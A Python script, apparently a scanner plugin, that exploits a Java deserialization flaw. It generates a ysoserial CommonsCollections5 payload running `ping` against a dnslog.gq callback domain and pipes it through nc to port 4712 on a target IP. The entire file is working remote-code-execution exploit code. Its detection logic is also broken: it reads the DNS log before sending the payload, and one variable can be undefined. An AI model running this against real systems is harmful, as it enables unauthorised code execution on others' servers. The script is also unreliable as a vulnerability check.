import re
import requests
import subprocess


def getdomain():
    try:
        s = requests.post("http://api.dnslog.gq:88/v1/users", timeout=10)
        token = s.json()['data']['token']
        domain = s.json()['data']['identity']
    except Exception as e:
        print(e)
    return domain, token


def getresult(domain, token):
    try:
        s1 = requests.get(f"http://api.dnslog.gq:88/v1/records?type=dns&token={token}&filter=")
        records = s1.json()['data'][0]['name']
        if records == domain:
            return True
    except Exception as e:
        print(e)


def check(url, proxies):
    if proxies:
        proxies = {proxies['protocol']: proxies['protocol'] + '://' + proxies['ip'] + ':' + str(proxies['port'])}
    domain, token = getdomain()
    result = getresult(domain, token)
    try:
        ip_re = r"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b"
        hostname = re.findall(ip_re, url)[0]
        ret = {'success': False, 'response': [], 'requests': [], 'error': [], 'info': []}
        popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'CommonsCollections5', f'ping {domain}'],
                                 stdout=subprocess.PIPE, shell=True)
        popen2 = subprocess.check_output(['nc', f'{hostname}', '4712'], stdin=popen.stdout)
        popen.wait()
        if result:
            ret['success'] = True
    except Exception as e:
        print(e)
    return ret


def main(params):
    result = params.get('result', {})
    url = params.get('url', '')
    headers = params.get('headers', {})
    proxies = params.get('proxies', None)  # 代理
    timeout = params.get('timeout', 5)  # 超时时间
    result = check(url, proxies)
    return result


if __name__ == '__main__':
    params = {
        'result': {'success': False, 'response': [], 'requests': [], 'error': []},
        # headers：传入的header参数
        'headers': {},
        # proxy：传入的代理服务器参数
        'proxies': {'protocol': 'http', 'ip': '127.0.0.1', 'port': 8080},
        'timeout': 5,
        ###可选参数###
        'url': "http://192.168.160.201",
    }
    ###main方法###
    print(main(params))
